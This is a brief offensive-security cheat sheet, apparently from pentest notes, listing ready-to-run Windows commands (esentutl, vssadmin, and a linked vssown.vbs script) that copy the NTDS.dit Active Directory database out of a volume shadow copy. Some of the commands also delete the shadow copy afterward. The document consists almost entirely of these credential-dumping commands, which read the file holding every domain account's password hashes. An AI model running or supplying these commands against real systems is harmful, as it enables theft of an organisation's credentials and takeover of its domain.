# Shadow Copy

## Esentutl method

Need admin privilege on the computer

```
esentutl.exe /y /vss C:\Windows\NTDS\NTDS.dit /d C:\ntds.dit.bak
```

## Vssadmin method

Need admin privilege on the computer

```
vssadmin create shadow /for=C: 
copy $ShadowCopyName\Windows\NTDS\NTDS.dit C:\ntds.dit.save 
vssadmin delete shadows /shadow=$ShadowCopyId 
```

## Vssown method

Execute vba script with admin privilege on the computer

https://github.com/lanmaster53/ptscripts/blob/master/windows/vssown.vbs

```
cscript vssown.vbs /start
cscript vssown.vbs /create c
cscript vssown.vbs /list
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit C:\ntds.dit
cscript vssown.vbs /delete 
```
